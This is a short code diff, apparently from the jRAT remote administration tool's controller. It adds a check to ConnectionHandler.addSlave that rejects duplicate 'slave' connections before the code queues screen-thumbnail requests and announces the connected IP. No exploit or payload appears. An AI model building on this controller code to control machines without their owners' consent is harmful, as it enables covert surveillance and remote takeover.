@@ -6,27 +6,33 @@ import se.jrat.controller.SampleMode;
 import se.jrat.controller.Slave;
 import se.jrat.controller.addons.PluginEventHandler;
 import se.jrat.controller.exceptions.CloseException;
+import se.jrat.controller.exceptions.DuplicateSlaveException;
 import se.jrat.controller.packets.outgoing.Packet40Thumbnail;
 import se.jrat.controller.utils.TrayIconUtils;
 
 public class ConnectionHandler {
 
 	public synchronized static void addSlave(AbstractSlave slave) {
-		Main.connections.add(slave);
+		if (slave.isAdded()) {
+			slave.disconnect(new DuplicateSlaveException());
+		} else {
+			slave.setAdded(true);
+			Main.connections.add(slave);
 
-		if (Main.instance.showThumbnails() && slave instanceof Slave) {
-			((Slave)slave).addToSendQueue(new Packet40Thumbnail());
-		}
+			if (Main.instance.showThumbnails() && slave instanceof Slave) {
+				((Slave)slave).addToSendQueue(new Packet40Thumbnail());
+			}
 
-		Main.instance.getPanelClients().addSlave(slave);
+			Main.instance.getPanelClients().addSlave(slave);
 
-		String title = Main.formatTitle();
-		Main.instance.setTitle(title);
+			String title = Main.formatTitle();
+			Main.instance.setTitle(title);
 
-		TrayIconUtils.setTitle(title);
-		TrayIconUtils.showMessage(title, slave.getIP() + " connected");
+			TrayIconUtils.setTitle(title);
+			TrayIconUtils.showMessage(title, slave.getIP() + " connected");
 
-		PluginEventHandler.onConnect(slave);
+			PluginEventHandler.onConnect(slave);
+		}	
 	}
 
 	public synchronized static void removeSlave(AbstractSlave client, Exception e) {
